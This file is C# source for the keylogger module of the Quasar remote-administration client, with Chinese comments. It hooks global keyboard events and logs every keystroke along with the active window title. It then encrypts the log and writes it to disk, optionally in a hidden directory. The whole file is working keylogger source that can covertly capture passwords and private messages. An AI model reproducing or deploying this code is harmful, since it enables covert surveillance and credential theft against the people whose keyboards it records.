using Gma.System.MouseKeyHook;
using Quasar.Client.Config;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Web;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Quasar.Client.Logging
{
    /// <summary>
    ///  该类提供键盘记录功能，并修改/强调输出，以获得更好的用户体验。
    /// </summary>
    public class Keylogger : IDisposable
    {
        /// <summary>
        /// <c>True</c> 如果该类已经被处理掉，否则 <c>false</c>.
        /// </summary>
        public bool IsDisposed { get; private set; }

        /// <summary>
        /// 用于定期将 <see cref="_logFileBuffer"/>从内存冲到磁盘的计时器。
        /// </summary>
        private readonly Timer _timerFlush;

        /// <summary>
        /// 用来在内存中存储记录的钥匙的缓冲区。
        /// </summary>
        private readonly StringBuilder _logFileBuffer = new StringBuilder();

        /// <summary>
        /// 在处理过程中，按过的键的临时列表。
        /// </summary>
        private readonly List<Keys> _pressedKeys = new List<Keys>();

        /// <summary>
        /// 在处理过程中，临时列出被按下的按键字符。
        /// </summary>
        private readonly List<char> _pressedKeyChars = new List<char>();

        /// <summary>
        /// 保存一个应用程序的最后一个窗口标题。
        /// </summary>
        private string _lastWindowTitle = string.Empty;

        /// <summary>
        /// 决定是否应该忽略特殊键的处理，例如，当修改键被按下时。
        /// </summary>
        private bool _ignoreSpecialKeys;

        /// <summary>
        /// 用于钩住全局鼠标和键盘事件。
        /// </summary>
        private readonly IKeyboardMouseEvents _mEvents;

        /// <summary>
        /// 提供加密和解密方法，安全地存储日志文件。
        /// </summary>
        private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);

        /// <summary>
        /// 单个日志文件的最大尺寸。
        /// </summary>
        private readonly long _maxLogFileSize;

        /// <summary>
        ///  初始化一个提供键盘记录功能的 <see cref="Keylogger"/> 的新实例。
        /// </summary>
        /// <param name="flushInterval">将缓冲区从内存冲到磁盘的时间间隔。</param>
        /// <param name="maxLogFileSize">单个日志文件的最大尺寸。</param>
        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _mEvents = Hook.GlobalEvents();
            _timerFlush = new Timer { Interval = flushInterval };
            _timerFlush.Elapsed += TimerElapsed;
        }

        /// <summary>
        /// 开始对键盘进行记录。
        /// </summary>
        public void Start()
        {
            Subscribe();
            _timerFlush.Start();
        }

        /// <summary>
        /// 处置该类所使用的资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed)
                return;

            if (disposing)
            {
                Unsubscribe();
                _timerFlush.Stop();
                _timerFlush.Dispose();
                _mEvents.Dispose();
                WriteFile();
            }

            IsDisposed = true;
        }

        /// <summary>
        /// 订阅了所有的关键事件。
        /// </summary>
        private void Subscribe()
        {
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += OnKeyPress;
        }

        /// <summary>
        /// 退订所有关键事件。
        /// </summary>
        private void Unsubscribe()
        {
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= OnKeyPress;
        }

        /// <summary>
        /// 初始处理下键事件并更新窗口标题。
        /// </summary>
        /// <param name="sender">事件的发件人。</param>
        /// <param name="e">键盘事件的参数，例如：键盘代码。</param>
        /// <remarks>这个事件处理程序首先被调用。</remarks>
        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
            {
                _lastWindowTitle = activeWindowTitle;
                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - " 
                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo) 
                    + " UTC</b>]</p><br>");
            }

            if (_pressedKeys.ContainsModifierKeys())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                // 该键不属于我们希望过滤的键，所以 一定要防止出现多个键被按下的情况。

                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                }
            }
        }

        /// <summary>
        /// 处理被按下的键，并将其附加到<see cref="_logFileBuffer"/>。对Unicode字符的处理从这里开始。
        /// </summary>
        /// <param name="sender">事件的发件人。</param>
        /// <param name="e">按键事件的args，特别是被按下的KeyChar。</param>
        /// <remarks>这个事件处理程序被第二次调用。</remarks>
        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var filtered = HttpUtility.HtmlEncode(e.KeyChar.ToString());
                if (!string.IsNullOrEmpty(filtered))
                {
                    Debug.WriteLine("OnKeyPress Output: " + filtered);
                    if (_pressedKeys.ContainsModifierKeys())
                        _ignoreSpecialKeys = true;

                    _pressedKeyChars.Add(e.KeyChar);
                    _logFileBuffer.Append(filtered);
                }
            }
        }

        /// <summary>
        ///完成按键的处理。
        /// </summary>
        /// <param name="sender">事件的发送者。</param>
        /// <param name="e">按键事件参数。</param>
        /// <remarks>这个事件处理程序被第三次调用。</remarks>
        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
            _pressedKeyChars.Clear();
        }

        /// <summary>
        /// 在一个给定的键字符列表中找到一个按住的键字符。
        /// </summary>
        /// <param name="list">按键字符的列表。</param>
        /// <param name="search">要搜索的按键字符。</param>
        /// <returns><c>True</c> 如果列表中包含按键字符，否则 <c>false</c>.</returns>
        private bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        /// <summary>
        /// 在HTML中为特殊键添加特殊高亮显示。
        /// </summary>
        /// <param name="keys">输入键。</param>
        /// <returns>突出显示的特殊按键。</returns>
        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!_ignoreSpecialKeys)
                {
                    names[i] = keys[i].GetDisplayName();
                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    _pressedKeys.Remove(keys[i]);
                }
            }

            _ignoreSpecialKeys = false;

            if (_pressedKeys.ContainsModifierKeys())
            {
                StringBuilder specialKeys = new StringBuilder();

                int validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i])) continue;

                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }

                // 如果在特殊键字符串构建器中有项目，给它一个结束标签
                if (validSpecialKeys > 0)
                    specialKeys.Append("]</p>");

                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                return specialKeys.ToString();
            }

            StringBuilder normalKeys = new StringBuilder();

            for (int i = 0; i < names.Length; i++)
            {
                _pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i])) continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                        break;
                    case "Escape":
                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                        break;
                    default:
                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
                        break;
                }
            }

            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
            return normalKeys.ToString();
        }

        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        /// <summary>
        /// 将记录的键从内存中写到磁盘上。
        /// </summary>
        private void WriteFile()
        {
            // TODO: 增加一些内务管理并删除旧的日志条目
            bool writeHeader = false;

            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));

            try
            {
                DirectoryInfo di = new DirectoryInfo(Settings.LOGSPATH);

                if (!di.Exists)
                    di.Create();

                if (Settings.HIDELOGDIRECTORY)
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                int i = 1;
                while (File.Exists(filePath))
                {
                    // 大的日志文件需要很长的时间来读取、解密和追加新的日志，
                    // 所以如果前一个日志文件的大小超过_maxLogFileSize，就会创建一个新的日志文件。
                    long length = new FileInfo(filePath).Length;
                    if (length < _maxLogFileSize)
                    {
                        break;
                    }

                    // 在文件名上附加一个数字
                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
                    filePath = Path.Combine(Settings.LOGSPATH, newFileName);
                    i++;
                }

                if (!File.Exists(filePath))
                    writeHeader = true;

                StringBuilder logFile = new StringBuilder();

                if (writeHeader)
                {
                    logFile.Append(
                        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                        DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");

                    logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");

                    _lastWindowTitle = string.Empty;
                }

                if (_logFileBuffer.Length > 0)
                {
                    logFile.Append(_logFileBuffer);
                }

                FileHelper.WriteLogFile(filePath, logFile.ToString(), _aesInstance);

                logFile.Clear();
            }
            catch
            {
            }

            _logFileBuffer.Clear();
        }
    }
}
